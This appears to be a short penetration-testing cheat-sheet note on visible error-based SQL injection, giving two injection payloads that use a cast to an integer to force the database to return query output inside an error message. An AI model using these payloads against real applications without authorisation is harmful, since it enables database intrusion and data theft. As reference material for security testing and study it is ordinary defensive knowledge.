## Visible Error Based Sqli
- Use cast function to output verbose error when it compare to not-boolean type
```
' and 1=cast((select 2) as int)--
```

- From syntax error
```
'||cast((select 2) as int)--
```
